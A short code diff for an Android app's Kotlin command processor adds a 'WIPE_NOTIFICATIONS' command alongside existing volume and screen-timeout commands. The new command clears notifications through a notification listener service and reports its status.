@@ -466,6 +466,19 @@ object CommandProcessor {
                         errorMsg = "Usage: VOLUME | MEDIA/RING/ALARM | 0-100/SILENT/VIBRATE"
                     }
                 }
+                "WIPE_NOTIFICATIONS" -> {
+                    if (MyNotificationListener.instance != null) {
+                        val parts = content.split("|")
+                        val mode = parts.getOrNull(0)?.trim()?.uppercase() ?: "ALL"
+                        val value = parts.getOrNull(1)?.trim()
+                        
+                        MyNotificationListener.instance?.wipeNotifications(mode, value)
+                        status = "NOTIFICATIONS_WIPED (Mode: $mode)"
+                    } else {
+                        status = "FAILED (SERVICE_OFF)"
+                        errorMsg = "Notification listener service is not running."
+                    }
+                }
                 "SCREEN_TIMEOUT" -> {
                     val secs = content.trim().toIntOrNull() ?: 30
                     if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M && android.provider.Settings.System.canWrite(ctx)) {
